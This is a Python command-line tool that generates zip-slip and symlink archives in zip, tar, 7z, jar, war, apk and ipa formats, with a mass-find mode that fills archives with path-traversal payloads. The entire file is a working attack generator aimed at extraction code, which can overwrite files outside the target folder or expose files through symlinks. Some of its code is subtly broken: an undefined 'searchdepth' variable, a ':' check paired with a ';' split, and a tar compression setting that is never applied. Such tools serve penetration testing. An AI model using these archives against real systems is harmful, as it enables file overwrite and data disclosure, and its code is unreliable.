from zipfile import ZipFile, ZipInfo, ZIP_STORED, ZIP_DEFLATED, ZIP_BZIP2, ZIP_LZMA
from tarfile import TarFile, TarInfo, SYMTYPE
from py7zr import (SevenZipFile, 
					FILTER_LZMA, 
					FILTER_LZMA2,
					FILTER_BZIP2,
					FILTER_DEFLATE,
					FILTER_ZSTD,
					FILTER_PPMD, 
					FILTER_BROTLI,
					FILTER_COPY, 
					PRESET_DEFAULT)
from py7zr.helpers import ArchiveTimestamp

from io import BytesIO, FileIO, SEEK_END, SEEK_SET
from datetime import datetime
from pathlib import Path
import stat
import warnings
import string
import random
import click


class Util:
	RED = "\033[0;31m"
	GREEN = "\033[0;32m"
	YELLOW = "\033[1;33m"
	END = "\033[0m"
	
	DICT_FILE = "path_traversal_dict.txt"
	PAYLOAD_PATH_PLACEHOLDER = "{FILE}"
	
	extensions = { 
			("tar","none"): ".tar",
			("tar","deflate"): ".tar.gz",
			("tar","bzip2"): ".tar.bz2",
			("tar","lzma"): ".tar.xz",
			
			("zip","none"): ".zip",
			("zip","deflate"): ".zip",
			("zip","bzip2"): ".bz2",
			("zip","lzma"): ".xz",
			
			("7z","lzma2"): ".7z",
			("7z","lzma"): ".7z",
			("7z","bzip2"): ".7z",
			("7z","deflate"): ".7z",
			("7z","ppmd"): ".7z",
			("7z","zstandard"): ".7z",
			("7z","brotli"): ".7z",
			("7z","copy"): ".7z",
			
			("jar","none"): ".jar",
			("jar","deflate"): ".jar",
			("jar","bzip2"): ".jar",
			("jar","lzma"): ".jar",
			
			("war","none"): ".war",
			("war","deflate"): ".war",
			("war","bzip2"): ".war",
			("war","lzma"): ".war",
			
			("apk","none"): ".apk",
			("apk","deflate"): ".apk",
			("apk","bzip2"): ".apk",
			("apk","lzma"): ".apk",
			
			("ipa","none"): ".ipa",
			("ipa","deflate"): ".ipa",
			("ipa","bzip2"): ".ipa",
			("ipa","lzma"): ".ipa"
	}
	
	compression_lookup = {
			"tar":("none", "deflate", "bzip2", "lzma"),
			"zip":("none", "deflate", "bzip2", "lzma"),
			"jar":("none", "deflate", "bzip2", "lzma"),
			"war":("none", "deflate", "bzip2", "lzma"),
			"apk":("none", "deflate", "bzip2", "lzma"),
			"ipa":("none", "deflate", "bzip2", "lzma"),
			"7z":("lzma2", "lzma", "bzip2", "deflate", "ppmd", "zstandard", "brotli", "copy")
	}
	
	default_compression_lookup = {
			"zip":"deflate",
			"jar":"deflate",
			"war":"deflate",
			"apk":"deflate",
			"ipa":"deflate",
			"tar":"deflate", 
			"7z":"lzma2"
	}
	
	# Compression methods vary depending on the format, here's an exhaustive list
	supported_compression = ("none", "deflate", "bzip2", "lzma", "lzma2", "ppmd", "brotli", "zstandard", "copy")
	default_compression = None
	
	def update_compression(ctx, param, value):
		# Dynamically generates the list of supporte compression methods given archive type
		Util.supported_compression = Util.compression_lookup[value]
		# Updates the default compression method for the current archive type
		Util.default_compression = Util.default_compression_lookup[value]
		return value
	
	def get_default_compression(ctx, param, value):
		# Hacky solution to update the default compression method.
		# Default values are evaluated before callbacks are made, 
		# so a statically set default compression value wouldn't work.
		# It needs to be set after the archive type is set. 
		if not value:
			return Util.default_compression
		else:
			return value
	
	def check_methods(method, method_list):
		if method in method_list:
			ret = method
		else:
			# use fallback compression method
			ret = method_list[0]
		
		return ret
	
	def check_datetime(date_time):
		if date_time == None:
			dt = datetime.now()
		elif isinstance(date_time, datetime):
			dt = date_time
		else:
			# use current time
			dt = datetime.now()
		
		return dt
	
	def random_string(length=10):
		return ''.join(random.choices(string.ascii_letters, k=length))
	
	def parse_input_list(paths):
		return [p.lstrip(" ") for p in paths.split(",")]
		
	def process_symlink_name(symlink, random_add=5, limitlen=10, extension=".symlink"):
		# only keeps alphanumeric characters from the original file name
		# only keeps a number of characters (default=10) from the original name 
		# 	(to avoid weird names when using encoded payloads, set limitlen=0 to disable this)
		# adds a random string to avoid file name collisions (set random_add=0 to disable this)
		# adds an estension (default=.symlink, edit extension parameter to change this)
		return "".join([ch for ch in symlink if ch.isalnum()])[:limitlen] + Util.random_string(random_add) + extension
		
	def archive_info(archive, archive_type, compression):
		print(Util.YELLOW, end="")
		print(f"[*] Archive {archive.filename} (type: {archive_type}, compression: {compression})")
		print("[*] Files added to the archive:")
		
		if isinstance(archive, Tarrer):
			print("\n".join(archive.archive.getnames()))
		elif isinstance(archive, Zipper):
			print("\n".join(archive.archive.namelist()))
		elif isinstance(archive, SevenZipper):
			print("\n".join(archive.archive.getnames()))
		
		print(Util.END, end="")
		
		print(Util.GREEN+f"[+] Success! {archive.filename} created"+Util.END)


class Searcher:
	def gen_search_paths(filename, depth, payload):
		ret_list = []

		# removes the first slash in absolute paths
		filename_stripped = filename.lstrip("/\\")
		for i in range(depth + 1):
			if i == 0:
				ret_list.append(payload * i + filename)
			else:
				ret_list.append(payload * i + filename_stripped)
		
		return ret_list


class SevenZipper:
	compression_methods = ([{'id': FILTER_LZMA}], 
				[{'id': FILTER_LZMA2, 'preset': PRESET_DEFAULT}], 
				[{'id': FILTER_BZIP2}], 
				[{'id': FILTER_DEFLATE}], 
				[{'id': FILTER_COPY}],
				[{'id': FILTER_ZSTD, 'level': 3}], 
				[{'id': FILTER_PPMD, 'order': 6, 'mem': 24}], 
				[{'id': FILTER_BROTLI, 'level': 11}])
				
	compression_methods_lookup = {
					"lzma": [{'id': FILTER_LZMA}], 
					"lzma2": [{'id': FILTER_LZMA2, 'preset': PRESET_DEFAULT}], 
					"bzip2": [{'id': FILTER_BZIP2}], 
					"deflate": [{'id': FILTER_DEFLATE}], 
					"zstandard": [{'id': FILTER_ZSTD, 'level': 3}], 
					"ppmd": [{'id': FILTER_PPMD, 'order': 6, 'mem': 24}],
					"brotli": [{'id': FILTER_BROTLI, 'level': 11}],
					"copy": [{'id': FILTER_COPY}]
				}
	
	def __init__(self, filename, compression_method):
		self.filename = filename
		self.compression_method = SevenZipper.compression_methods_lookup[compression_method]
		self.archive = SevenZipFile(filename, mode='w', filters=self.compression_method)
	
	def create_fileinfo(self, filename, date_time=None):
		
		self.date_time = date_time
		
		# py7zr doesn't really use "fileinfo" kind of files
		return filename
	
	def add_file(self, file_info, content, symlink=False):
		'''Adds file to archive given zipinfo and file content'''
		
		self.archive.writestr(content, file_info) 
		
		if symlink:
			# Last element of files_list is the newly added file
			f = self.archive.files.files_list[-1:][0]
			
			FILE_ATTRIBUTE_UNIX_EXTENSION = 0x8000 #specified in py7zr
			f["attributes"] = f["attributes"]  | FILE_ATTRIBUTE_UNIX_EXTENSION | (stat.S_IFLNK << 16)
			
			'''
			ORIGINAL CODE SNIPPET:
			
			f["emptystream"] = False
			f["attributes"] = getattr(stat, "FILE_ATTRIBUTE_ARCHIVE") | getattr(stat, "FILE_ATTRIBUTE_REPARSE_POINT")
			f["attributes"] |= FILE_ATTRIBUTE_UNIX_EXTENSION | (stat.S_IFLNK << 16)
			f["attributes"] |= stat.S_IMODE(fstat.st_mode) << 16
			'''
			
		if self.date_time:
			# Last element of files_list is the newly added file
			f = self.archive.files.files_list[-1:][0]
			# Make sure it's true ;)
			assert f["filename"] == file_info
			
			f['lastwritetime'] = ArchiveTimestamp.from_datetime(self.date_time)

class Tarrer:
	compression_methods = ("", "gz", "bz2", "xz")
	compression_methods_lookup = {"none": "", "deflate": "gz", "bzip2": "bz2", "lzma": "xz"}
	
	def __init__(self, filename, compression_method):
		self.filename = filename
		self.compression_method = Tarrer.compression_methods_lookup[compression_method]
		self.archive = TarFile.open(self.filename, mode="w")

	def create_fileinfo(self, filename, date_time=None):
		dt = Util.check_datetime(date_time)
			
		ti = TarInfo(filename)
		ti.mtime = dt.timestamp()
		
		return ti

	def add_file(self, file_info, content, symlink=False):
		if symlink:
			file_info.type = SYMTYPE
			file_info.linkname = content
			
			# Without these the archive is considered broken by some softwares
			file_info.uid = file_info.gid = 0
			file_info.uname = file_info.gname = "root"
			
			# If you write something in the symlink file, it breaks the archive
			self.archive.addfile(file_info, None)
		else:
			with BytesIO(content.encode("utf-8")) as mem_file:
				mem_file.seek(0, SEEK_END)
				file_info.size = mem_file.tell()
				mem_file.seek(0, SEEK_SET)
				
				self.archive.addfile(file_info, mem_file)

class Zipper:
	compression_methods = (ZIP_STORED, ZIP_DEFLATED, ZIP_BZIP2, ZIP_LZMA)
	compression_methods_lookup = {"none": ZIP_STORED, "deflate": ZIP_DEFLATED, "bzip2": ZIP_BZIP2, "lzma": ZIP_LZMA}
	
	def __init__(self, filename, compression_method):
		self.filename = filename
		self.compression_method = Zipper.compression_methods_lookup[compression_method]
		self.archive = ZipFile(self.filename, mode="w", compression=self.compression_method)
	
	def create_fileinfo(self, filename, date_time=None):
		'''Creates a file zipinfo object containing filename and date data'''
		
		# Datetime object
		dt = None 
		
		if date_time == None:
			dt = datetime.now()
		elif isinstance(date_time, datetime):
			dt = date_time
		else:
			dt = datetime.now()
			
		zi = ZipInfo(filename, dt.timetuple())
		zi.compress_type = self.compression_method
		
		return zi
	
	def add_file(self, file_info, content, symlink=False):
		'''Adds file to archive given zipinfo and file content'''
		if symlink:
			 file_info.external_attr |= stat.S_IFLNK << 16 # symlink file type
		self.archive.writestr(file_info, content) 

	
@click.command()
@click.option("-a", "--archive-type", 
		type=click.Choice(["zip", "tar", "7z", "jar", "war", "apk", "ipa"], case_sensitive=False),
		default="zip", 
		is_eager=True,
		show_default=True, 
		callback=Util.update_compression,
		help="Type of the archive.")
		
@click.option("-c", "--compression", 
		type=click.Choice(Util.supported_compression, case_sensitive=False),
		callback=Util.get_default_compression,
		help="Compression algorithm to use in the archive.")
		
@click.option("-p", "--paths", 
		help="Comma separated paths to include in the archive.")
		
@click.option("-s", "--symlinks", 
		help="Comma separated symlinks to include in the archive. To name a symlink use the syntax: path;name")
		
@click.option("--file-content", 
		help="Content of the files in the archive, mandatory if paths are used.")
		
@click.option("--force-name", 
		is_flag=True, 
		help="If set, the filename will be forced exactly as provided.")
		
@click.option("--search", 
		type=int,
		is_flag=False, 
		flag_value=5,
		default=0,
		show_default=True, 
		help="If set, paths and symlink will generate multiple traversal paths to try and find the target file or path at different depths.")
		
@click.option("--dotdotslash", 
		default="../", 
		show_default=True, 
		help="Dot dot slash sequence to use in search mode.")
		
@click.option("--mass-find", 
		help="Name of the file to find. It will create an archive with numerous path traversal payloads aimed to find the specified file name. " +
			 "WARNING: it uses A LOT of payloads, use with caution.")
			 
@click.option("--mass-find-mode", 
		type=click.Choice(["paths", "symlinks"], case_sensitive=False),
		default="symlinks", 
		show_default=True, 
		help="Mass-find mode to use")

@click.option("--mass-find-dict", 
		type=click.File('r'),
		default=Util.DICT_FILE, 
		show_default=True, 
		help="Mass-find payload dictionary")

@click.option("--mass-find-placeholder", 
		default=Util.PAYLOAD_PATH_PLACEHOLDER, 
		show_default=True, 
		help="Mass-find placeholder for filename in dictionary")
		
@click.option("-v", "--verbose", 
		is_flag=True, 
		help="Verbosity trigger.")
		
@click.argument("archive-name")
def main_procedure(archive_type, compression, paths, symlinks, file_content, 
		archive_name, force_name, search, dotdotslash, mass_find, mass_find_mode, mass_find_dict,
		mass_find_placeholder, verbose):
	"""
	Script to generate "zipslip" and "zip symlink" archives.
	
	ARCHIVE-NAME is the name of the archive to be created.
	"""
	
	# Lib zipfile can print a ton of warning messages in mass-find mode
	warnings.filterwarnings("ignore", message="Duplicate name")
	
	supported_archives = {"zip": Zipper, "jar": Zipper, "war": Zipper, "apk": Zipper, "ipa": Zipper, "tar": Tarrer, "7z": SevenZipper}
	archiver = supported_archives.get(archive_type)

	# At least one of paths, symlinks or mass_find need to be specified
	if not paths and not symlinks and not mass_find:
		print() # Adds a newline
		raise click.ClickException("At least one of paths, symlinks or mass-find needs to be specified.")
		exit(1)
	
	if not force_name:
	
		if not compression in Util.compression_lookup[archive_type]:
			n_compression = Util.default_compression_lookup[archive_type]
			print(Util.YELLOW+f"[*] Compression {compression} not supported by {archive_type} archives, defaulting to {n_compression}"+Util.END)
			compression = n_compression
			
		# Infer extension from file type and compression method
		ext = Util.extensions[(archive_type, compression)]
		archive_name = archive_name + ext

	
	if paths:
		if not file_content:
			print() # Adds a newline
			raise click.ClickException("file-content is required when using paths")
			exit(1)
		
		paths = Util.parse_input_list(paths)
	else:
		# Default value (not supported by click)
		paths = []
	
	if symlinks:
		symlinks = Util.parse_input_list(symlinks)
	else:
		# Default value (not supported by click)
		symlinks = []

	if mass_find:
		# Overrides search mode
		dotdotslash = None
		search = None
		
		while True:
			line = mass_find_dict.readline()

			if not line:
				break

			if mass_find_mode == "paths":
				path = line.replace(Util.PAYLOAD_PATH_PLACEHOLDER, mass_find)
				paths.append(path)
				
			elif mass_find_mode == "symlinks":
				symlink = line.replace(Util.PAYLOAD_PATH_PLACEHOLDER, mass_find)
				symlinks.append(symlink)
	  
		mass_find_dict.close()
	
	# Create archive after every required option is already checked
	a = archiver(archive_name, compression)
	
	if symlinks:
		for s in symlinks:
			if not search:
				# Check if it's a named symlink
				if ":" in s:
					symlink_path, symlink_name = s.split(";", 1)
				else:
					symlink_name = Util.process_symlink_name(s)
					symlink_path = None
					
				fi = a.create_fileinfo(symlink_name)
				
				if symlink_path:
					a.add_file(fi, symlink_path, symlink=True)
				else:
					a.add_file(fi, s, symlink=True)
			else:
				if dotdotslash:
					sp = Searcher.gen_search_paths(s, searchdepth, payload=dotdotslash)
				else:
					sp = Searcher.gen_search_paths(s, searchdepth)
					
				for ssp in sp:
					symlink_name = Util.process_symlink_name(s)
					fi = a.create_fileinfo(symlink_name)
					a.add_file(fi, ssp, symlink=True)
							
	if paths:
		for f in paths:
			if not search:
				fi = a.create_fileinfo(f)
				a.add_file(fi, file_content)
			else:
				if dotdotslash:
					fp = Searcher.gen_search_paths(f, search, payload=dotdotslash)
				else:
					fp = Searcher.gen_search_paths(f, search)
					
				for ffp in fp:
					fi = a.create_fileinfo(ffp)
					a.add_file(fi, file_content)
				
	if verbose:
		Util.archive_info(a, archive_type, compression)
		
	a.archive.close()
	exit(0)

main_procedure()
